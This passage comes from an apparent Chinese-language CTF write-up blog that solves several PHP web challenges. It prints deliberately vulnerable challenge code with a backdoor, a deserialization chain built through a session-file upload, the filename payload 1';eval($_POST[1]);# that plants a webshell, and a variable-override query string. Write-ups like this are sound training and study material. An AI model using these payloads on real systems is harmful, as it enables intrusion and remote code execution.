class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;Config-&gt;<span class="title function_ invoke__">showconf</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Config</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$uname</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$passwd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$avatar</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nickname</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sex</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mail</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$telnum</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;alert(&#x27;edit conf success\\n&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;//&#x27;</span>,<span class="string">&#x27;\n&#x27;</span>,<span class="variable">$this</span>-&gt;<span class="title function_ invoke__">showconf</span>());</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&#x27;)&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">&quot;uname&quot;</span>,<span class="string">&quot;passwd&quot;</span>,<span class="string">&quot;avatar&quot;</span>,<span class="string">&quot;nickname&quot;</span>,<span class="string">&quot;sex&quot;</span>,<span class="string">&quot;mail&quot;</span>,<span class="string">&quot;telnum&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">showconf</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$show</span> = <span class="string">&quot;avatar)).&quot;</span>\<span class="string">&quot;/&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$show</span> .= <span class="string">&quot;nickname: <span class="subst">$this</span>-&gt;nickname&quot;</span>;</span><br><span class="line">        <span class="variable">$show</span> .= <span class="string">&quot;sex: <span class="subst">$this</span>-&gt;sex&quot;</span>;</span><br><span class="line">        <span class="variable">$show</span> .= <span class="string">&quot;mail: <span class="subst">$this</span>-&gt;mail&quot;</span>;</span><br><span class="line">        <span class="variable">$show</span> .= <span class="string">&quot;telnum: <span class="subst">$this</span>-&gt;telnum&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$show</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">is_string</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;backdoor&#x27;</span>]))&#123;</span><br><span class="line">            <span class="variable">$func</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;backdoor&#x27;</span>];</span><br><span class="line">            <span class="variable">$func</span>();<span class="comment">//:)</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Log</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$data</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$Config</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;data = PHP_EOL.<span class="string">&#x27;$_&#x27;</span>.<span class="title function_ invoke__">time</span>().<span class="string">&#x27; = \&#x27;&#x27;</span>.<span class="string">&quot;Edit: avatar-&gt;<span class="subst">$Config</span>-&gt;avatar, nickname-&gt;<span class="subst">$Config</span>-&gt;nickname, sex-&gt;<span class="subst">$Config</span>-&gt;sex, mail-&gt;<span class="subst">$Config</span>-&gt;mail, telnum-&gt;<span class="subst">$Config</span>-&gt;telnum&quot;</span>.<span class="string">&#x27;\&#x27;;&#x27;</span>.PHP_EOL;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;data === <span class="string">&quot;log_start()&quot;</span>)&#123;</span><br><span class="line">            <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;record.php&quot;</span>,<span class="string">&quot;data, FILE_APPEND);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure>
<h3 id="中间有一段resetconf-返回出厂设置，既然题目说把前端删了，用默认的应该就行了，所以我们去将默认数据的base64解码一下，得到uname和md5-md5-GET-‘passwd’-的信息，然后再爆破一下passwd就能顺利登录了"><a href="#中间有一段resetconf-返回出厂设置，既然题目说把前端删了，用默认的应该就行了，所以我们去将默认数据的base64解码一下，得到uname和md5-md5-GET-‘passwd’-的信息，然后再爆破一下passwd就能顺利登录了" class="headerlink" title="中间有一段resetconf()&#x2F;&#x2F;返回出厂设置，既然题目说把前端删了，用默认的应该就行了，所以我们去将默认数据的base64解码一下，得到uname和md5(md5($_GET[‘passwd’]))的信息，然后再爆破一下passwd就能顺利登录了"></a>中间有一段resetconf()&#x2F;&#x2F;返回出厂设置，既然题目说把前端删了，用默认的应该就行了，所以我们去将默认数据的base64解码一下，得到uname和md5(md5($_GET[‘passwd’]))的信息，然后再爆破一下passwd就能顺利登录了</h3><p><a target="_blank" rel="noopener" href="https://www.cmd5.com/default.aspx">md5爆破</a></p>
<h3 id="爆破成功后登录，发现是个类似于文件上传的界面"><a href="#爆破成功后登录，发现是个类似于文件上传的界面" class="headerlink" title="爆破成功后登录，发现是个类似于文件上传的界面"></a>爆破成功后登录，发现是个类似于文件上传的界面</h3><h3 id="接下来还是继续审计源代码吧，这里出题人给了两个提示点-和-O，分别在"><a href="#接下来还是继续审计源代码吧，这里出题人给了两个提示点-和-O，分别在" class="headerlink" title="接下来还是继续审计源代码吧，这里出题人给了两个提示点:)和:O，分别在"></a>接下来还是继续审计源代码吧，这里出题人给了两个提示点:)和:O，分别在</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_string</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;backdoor&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$func</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;backdoor&#x27;</span>];</span><br><span class="line">        <span class="variable">$func</span>();<span class="comment">//:)</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;data === <span class="string">&quot;log_start()&quot;</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;record.php&quot;</span>,<span class="string">&quot;</span></span><br></pre></td></tr></table></figure>
<p>当会话自动开始或者通过 session_start() 手动开始的时候， PHP 内部会依据客户端传来的PHPSESSID来获取现有的对应的会话数据（即session文件）， PHP 会自动反序列化session文件的内容，并将之填充到 $_SESSION 超级全局变量中。</p>
<h3 id="所以我们可以利用session写入文件来进行反序列化，刚好我们也有上传文件的功能，在session-start的同时上传session文件不就可以实现控制session文件的内容来反序列化了吗"><a href="#所以我们可以利用session写入文件来进行反序列化，刚好我们也有上传文件的功能，在session-start的同时上传session文件不就可以实现控制session文件的内容来反序列化了吗" class="headerlink" title="所以我们可以利用session写入文件来进行反序列化，刚好我们也有上传文件的功能，在session_start的同时上传session文件不就可以实现控制session文件的内容来反序列化了吗"></a>所以我们可以利用session写入文件来进行反序列化，刚好我们也有上传文件的功能，在session_start的同时上传session文件不就可以实现控制session文件的内容来反序列化了吗</h3><h3 id="启动反序列化的能力有了，接下来就是反序列化去做什么了"><a href="#启动反序列化的能力有了，接下来就是反序列化去做什么了" class="headerlink" title="启动反序列化的能力有了，接下来就是反序列化去做什么了"></a>启动反序列化的能力有了，接下来就是反序列化去做什么了</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Admin</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Config</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">editconf</span>(<span class="params"><span class="variable">$avatar</span>, <span class="variable">$nickname</span>, <span class="variable">$sex</span>, <span class="variable">$mail</span>, <span class="variable">$telnum</span></span>)</span>&#123;</span><br><span class="line">        <span class="comment">//编辑表单内容</span></span><br><span class="line">        <span class="variable">$Config</span> = <span class="variable language_">$this</span>-&gt;Config;</span><br><span class="line">        <span class="variable">$Config</span>-&gt;avatar = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">upload</span>(<span class="variable">$avatar</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">filesize</span>(<span class="string">&quot;record.php&quot;</span>) &gt; <span class="number">0</span>)&#123;</span><br><span class="line">            [<span class="keyword">new</span> <span class="title class_">Log</span>(<span class="variable">$Config</span>),<span class="string">&quot;log&quot;</span>]();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"><span class="variable">$avatar</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$path</span> = <span class="string">&quot;/tmp/&quot;</span>.<span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/\.\./&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$avatar</span>[<span class="string">&#x27;fname&#x27;</span>]);</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$path</span>,<span class="variable">$avatar</span>[<span class="string">&#x27;fdata&#x27;</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$path</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Log</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$data</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$Config</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;data = PHP_EOL.<span class="string">&#x27;$_&#x27;</span>.<span class="title function_ invoke__">time</span>().<span class="string">&#x27; = \&#x27;&#x27;</span>.<span class="string">&quot;Edit: avatar-&gt;<span class="subst">$Config</span>-&gt;avatar, nickname-&gt;<span class="subst">$Config</span>-&gt;nickname, sex-&gt;<span class="subst">$Config</span>-&gt;sex, mail-&gt;<span class="subst">$Config</span>-&gt;mail, telnum-&gt;<span class="subst">$Config</span>-&gt;telnum&quot;</span>.<span class="string">&#x27;\&#x27;;&#x27;</span>.PHP_EOL;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;data === <span class="string">&quot;log_start()&quot;</span>)&#123;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;record.php&quot;</span>,<span class="string">&quot;data, FILE_APPEND);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br></pre></td></tr></table></figure>
<h3 id="这里的当recoed-php不为空时写入log的功能给了我们植入木马的可乘之机，利用data中包含的avatar的文件路径加之php文件的-分句和-注释功能，所以我们就可以将文件名设置为1-eval-POST-1-来写马"><a href="#这里的当recoed-php不为空时写入log的功能给了我们植入木马的可乘之机，利用data中包含的avatar的文件路径加之php文件的-分句和-注释功能，所以我们就可以将文件名设置为1-eval-POST-1-来写马" class="headerlink" title="这里的当recoed.php不为空时写入log的功能给了我们植入木马的可乘之机，利用data中包含的avatar的文件路径加之php文件的;分句和#注释功能，所以我们就可以将文件名设置为1&#39;;eval($_POST[1]);#来写马"></a>这里的当recoed.php不为空时写入log的功能给了我们植入木马的可乘之机，利用data中包含的avatar的文件路径加之php文件的;分句和#注释功能，所以我们就可以将文件名设置为<code>1&#39;;eval($_POST[1]);#</code>来写马</h3><h3 id="所以我们就要让record-php不为空，刚好-toString-魔术方法可以写入，所以只要反序列化最终执行到-toString-即可，所以要让class-Log被视为字符串，刚好Config的showconf的-file-get-contents-this-avatar-会将他的一个元素视为字符串，刚好Config的-sleep-会执行showconf，这样链子就找到了"><a href="#所以我们就要让record-php不为空，刚好-toString-魔术方法可以写入，所以只要反序列化最终执行到-toString-即可，所以要让class-Log被视为字符串，刚好Config的showconf的-file-get-contents-this-avatar-会将他的一个元素视为字符串，刚好Config的-sleep-会执行showconf，这样链子就找到了" class="headerlink" title="所以我们就要让record.php不为空，刚好__toString()魔术方法可以写入，所以只要反序列化最终执行到__toString()即可，所以要让class Log被视为字符串，刚好Config的showconf的(file_get_contents($this-&gt;avatar)会将他的一个元素视为字符串，刚好Config的__sleep()会执行showconf，这样链子就找到了"></a>所以我们就要让record.php不为空，刚好__toString()魔术方法可以写入，所以只要反序列化最终执行到__toString()即可，所以要让class Log被视为字符串，刚好Config的showconf的(file_get_contents($this-&gt;avatar)会将他的一个元素视为字符串，刚好Config的__sleep()会执行showconf，这样链子就找到了</h3><blockquote>
<p>Config的__sleep()-&gt;Config的showconf-&gt;log的__toString()</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt; ?php</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Admin</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Config</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Config</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$uname</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$passwd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$avatar</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nickname</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sex</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mail</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$telnum</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Log</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$data</span>= <span class="string">&quot;log_start()&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> <span class="title class_">Config</span>();</span><br><span class="line"><span class="variable">$c</span>=<span class="keyword">new</span> <span class="title class_">Log</span>();</span><br><span class="line"><span class="variable">$b</span>-&gt;avatar=<span class="variable">$c</span>;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>));</span><br><span class="line">O:<span class="number">6</span>:<span class="string">&quot;Config&quot;</span>:<span class="number">7</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;uname&quot;</span>;N;s:<span class="number">6</span>:<span class="string">&quot;passwd&quot;</span>;N;s:<span class="number">6</span>:<span class="string">&quot;avatar&quot;</span>;O:<span class="number">3</span>:<span class="string">&quot;Log&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;data&quot;</span>;s:<span class="number">11</span>:<span class="string">&quot;log_start()&quot;</span>;&#125;s:<span class="number">8</span>:<span class="string">&quot;nickname&quot;</span>;N;s:<span class="number">3</span>:<span class="string">&quot;sex&quot;</span>;N;s:<span class="number">4</span>:<span class="string">&quot;mail&quot;</span>;N;s:<span class="number">6</span>:<span class="string">&quot;telnum&quot;</span>;N;&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://pick.lwzheng.tech/2025/02/07/67a5e3e07517f.png" alt="f732c43235a3100a54d0a226768e5bf0.png"></p>
<h3 id="然后为了文件被视为session文件，将文件名命名为sess-xxx，再将刚才的序列化对象填进去，这里我们还有根据环境变量session-serialize-handler将我们的文件改为对应的格式"><a href="#然后为了文件被视为session文件，将文件名命名为sess-xxx，再将刚才的序列化对象填进去，这里我们还有根据环境变量session-serialize-handler将我们的文件改为对应的格式" class="headerlink" title="然后为了文件被视为session文件，将文件名命名为sess_xxx，再将刚才的序列化对象填进去，这里我们还有根据环境变量session.serialize_handler将我们的文件改为对应的格式"></a>然后为了文件被视为session文件，将文件名命名为sess_xxx，再将刚才的序列化对象填进去，这里我们还有根据环境变量session.serialize_handler将我们的文件改为对应的格式</h3><p><img src="https://pick.lwzheng.tech/2025/02/07/67a5e2caa14d4.png" alt="b116d4f88eb7c18dacd952a9a1616bf1.png"><br><img src="https://pick.lwzheng.tech/2025/02/07/67a5e28298dc6.png" alt="d99c2316-f9af-45ff-9b17-35f93530777d.png"></p>
<h3 id="所以这里我们要用-将我们的序列化对象放在其后面才能启动反序列化，最终文件内容为xianxin-O-6-Config-7-s-5-uname-N-s-6-passwd-N-s-6-avatar-O-3-Log-1-s-4-data-s-11-log-start-s-8-nickname-N-s-3-sex-N-s-4-mail-N-s-6-telnum-N"><a href="#所以这里我们要用-将我们的序列化对象放在其后面才能启动反序列化，最终文件内容为xianxin-O-6-Config-7-s-5-uname-N-s-6-passwd-N-s-6-avatar-O-3-Log-1-s-4-data-s-11-log-start-s-8-nickname-N-s-3-sex-N-s-4-mail-N-s-6-telnum-N" class="headerlink" title="所以这里我们要用|将我们的序列化对象放在其后面才能启动反序列化，最终文件内容为xianxin|O:6:&quot;Config&quot;:7:{s:5:&quot;uname&quot;;N;s:6:&quot;passwd&quot;;N;s:6:&quot;avatar&quot;;O:3:&quot;Log&quot;:1:{s:4:&quot;data&quot;;s:11:&quot;log_start()&quot;;}s:8:&quot;nickname&quot;;N;s:3:&quot;sex&quot;;N;s:4:&quot;mail&quot;;N;s:6:&quot;telnum&quot;;N;}"></a>所以这里我们要用|将我们的序列化对象放在其后面才能启动反序列化，最终文件内容为<code>xianxin|O:6:&quot;Config&quot;:7:&#123;s:5:&quot;uname&quot;;N;s:6:&quot;passwd&quot;;N;s:6:&quot;avatar&quot;;O:3:&quot;Log&quot;:1:&#123;s:4:&quot;data&quot;;s:11:&quot;log_start()&quot;;&#125;s:8:&quot;nickname&quot;;N;s:3:&quot;sex&quot;;N;s:4:&quot;mail&quot;;N;s:6:&quot;telnum&quot;;N;&#125;</code></h3><h3 id="然后就是在文件上传的同时启动session-start，还要将cookie设置为PHPSESSID-xxx-抓包处理"><a href="#然后就是在文件上传的同时启动session-start，还要将cookie设置为PHPSESSID-xxx-抓包处理" class="headerlink" title="然后就是在文件上传的同时启动session_start，还要将cookie设置为PHPSESSID&#x3D;xxx,抓包处理"></a>然后就是在文件上传的同时启动session_start，还要将cookie设置为PHPSESSID&#x3D;xxx,抓包处理</h3><p><img src="https://pick.lwzheng.tech/2025/02/07/67a5e3b9e695b.png" alt="7fbfeeff13214d18667bc6d545685fd3.png"></p>
<h3 id="然后就是写马了"><a href="#然后就是写马了" class="headerlink" title="然后就是写马了"></a>然后就是写马了</h3><p><img src="https://pick.lwzheng.tech/2025/02/07/67a5e40988338.png" alt="6b0bc37e187f32a6f1da57e20658d714.png"></p>
<h3 id="接下来去访问record-php就可以任意命令执行了"><a href="#接下来去访问record-php就可以任意命令执行了" class="headerlink" title="接下来去访问record.php就可以任意命令执行了"></a>接下来去访问record.php就可以任意命令执行了</h3><p><img src="https://pick.lwzheng.tech/2025/02/07/67a5e4364e823.png" alt="8bfbde4353a25bf7c9ee947415277c0b.png"></p>
<h3 id="得到flag-1"><a href="#得到flag-1" class="headerlink" title="得到flag"></a>得到flag</h3><p><code>DASCTF&#123;26ebb27e-923d-4717-91c6-ce4a614505cb&#125; </code></p>
<h1 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h1><h3 id="进入页面非常多按钮，先不急着一个个看，先dirsearch扫一下，扫到-git，直接githack启动，得到源代码"><a href="#进入页面非常多按钮，先不急着一个个看，先dirsearch扫一下，扫到-git，直接githack启动，得到源代码" class="headerlink" title="进入页面非常多按钮，先不急着一个个看，先dirsearch扫一下，扫到.git，直接githack启动，得到源代码"></a>进入页面非常多按钮，先不急着一个个看，先dirsearch扫一下，扫到.git，直接githack启动，得到源代码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt; ?php</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$flag</span>);</span><br><span class="line"><span class="variable">$yds</span> = <span class="string">&quot;dog&quot;</span>;</span><br><span class="line"><span class="variable">$is</span> = <span class="string">&quot;cat&quot;</span>;</span><br><span class="line"><span class="variable">$handsome</span> = <span class="string">&#x27;yds&#x27;</span>;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;  <span class="comment">// $键 = $值的值</span></span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$y</span>;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$$y</span>;<span class="comment">// $handsome = flag的值  ---&gt;   $handsome = $flag  --&gt; $x=handsome &amp; $y=flag</span></span><br><span class="line">&#125;</span><br><span class="line"> <span class="comment">// 需要不满足以下几个条件</span></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="variable">$x</span> &amp;&amp; <span class="variable">$x</span> !== <span class="string">&#x27;flag&#x27;</span>)&#123;  <span class="comment">//不能同时 flag的值等于某个键名，那个键值又是flag</span></span><br><span class="line">        <span class="keyword">exit</span>(<span class="variable">$handsome</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]))&#123;<span class="comment">// 不能同时  GET 和 POST 都没设置 flag</span></span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$yds</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>  || <span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>)&#123;<span class="comment">// 任意都不能满足 flag === &#x27;flag&#x27;</span></span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$is</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;the flag is: &quot;</span>.<span class="variable">$flag</span>;</span><br></pre></td></tr></table></figure>
<h3 id="然后就代码审计，本地一点点试，把-flag输出出来就好"><a href="#然后就代码审计，本地一点点试，把-flag输出出来就好" class="headerlink" title="然后就代码审计，本地一点点试，把$flag输出出来就好"></a>然后就代码审计，本地一点点试，把$flag输出出来就好</h3><p><img src="https://pics.lwzheng.tech/2025/02/11/67ab506b874a2.png" alt="c6bfd4284f36a3a1192999590a88d373.png"></p>
<h3 id="最后试出来一种payload"><a href="#最后试出来一种payload" class="headerlink" title="最后试出来一种payload"></a>最后试出来一种payload</h3><blockquote>
<p>?yds&#x3D;handsome&amp;handsome&#x3D;flag&amp;flag&#x3D;yds</p>
</blockquote>
<p><img src="https://pics.lwzheng.tech/2025/02/11/67ab507426ea2.png" alt="865de144-633f-491f-b690-1dfba019913e.png"></p>
<h3 id="得到flag-2"><a href="#得到flag-2" class="headerlink" title="得到flag"></a>得到flag</h3><h1 id="网鼎杯-2020-朱雀组-phpweb"><a href="#网鼎杯-2020-朱雀组-phpweb" class="headerlink" title="[网鼎杯 2020 朱雀组]phpweb"></a>[网鼎杯 2020 朱雀组]phpweb</h1><h3 id="打开页面发现一直在变，抓包看一下发现一直在自动传入func和p两个参数，默认为data和一串看不懂的字符串，将func随手删掉一点变为dat，发现报错call-user-func-expects-parameter-1-to-be-a-valid-callback，且透露了call-user-func-为两个参数的执行命令，所以我们可以利用这一个函数进行RCE"><a href="#打开页面发现一直在变，抓包看一下发现一直在自动传入func和p两个参数，默认为data和一串看不懂的字符串，将func随手删掉一点变为dat，发现报错call-user-func-expects-parameter-1-to-be-a-valid-callback，且透露了call-user-func-为两个参数的执行命令，所以我们可以利用这一个函数进行RCE" class="headerlink" title="打开页面发现一直在变，抓包看一下发现一直在自动传入func和p两个参数，默认为data和一串看不懂的字符串，将func随手删掉一点变为dat，发现报错call_user_func() expects parameter 1 to be a valid callback，且透露了call_user_func()为两个参数的执行命令，所以我们可以利用这一个函数进行RCE"></a>打开页面发现一直在变，抓包看一下发现一直在自动传入func和p两个参数，默认为data和一串看不懂的字符串，将func随手删掉一点变为dat，发现报错<code>call_user_func() expects parameter 1 to be a valid callback</code>，且透露了call_user_func()为两个参数的执行命令，所以我们可以利用这一个函数进行RCE</h3><h3 id="但是尝试了system，eval，assert等几个后发现回显hacker-，判断有过滤，这里可以利用file-get-contents来先读取一下index-php"><a href="#但是尝试了system，eval，assert等几个后发现回显hacker-，判断有过滤，这里可以利用file-get-contents来先读取一下index-php" class="headerlink" title="但是尝试了system，eval，assert等几个后发现回显hacker!，判断有过滤，这里可以利用file_get_contents来先读取一下index.php"></a>但是尝试了system，eval，assert等几个后发现回显<code>hacker!</code>，判断有过滤，这里可以利用file_get_contents来先读取一下index.php</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt; ?php</span><br><span class="line">    <span class="variable">$disable_fun</span> = <span class="keyword">array</span>(<span class="string">&quot;exec&quot;</span>,<span 